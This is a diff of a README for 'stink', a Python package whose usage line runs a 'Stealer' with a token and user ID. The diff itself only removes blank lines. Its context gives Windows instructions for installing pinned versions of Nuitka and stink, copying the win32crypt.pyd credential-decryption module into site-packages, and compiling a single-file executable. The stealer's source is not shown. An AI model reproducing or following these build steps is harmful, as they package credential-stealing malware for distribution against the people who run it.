@@ -126,7 +126,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 pip install Nuitka==0.6.16.4
 ```
-
 ```
 pip install stink==0.0.3
 ```
@@ -137,7 +136,6 @@ nuitka --onefile --include-package=stink test.py
 
 ### CMD
 1. Open `cmd`.
-
 2. Type in the command:
 ```
 pip install virtualenv
@@ -150,7 +148,6 @@ cd path\to\file
 ```
 virtualenv venv
 ```
-
 ```
 venv\Scripts\activate
 ```
@@ -158,12 +155,10 @@ venv\Scripts\activate
 ```
 pip install Nuitka==0.6.16.4
 ```
-
 ```
 pip install stink==0.0.3
 ```
 6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`, copy the file `win32crypt.pyd` and paste in the path `\Lib\site-packages\`.
-
 7. Go back to `cmd` and write the command:
 ```
 nuitka --onefile --include-package=stink test.py
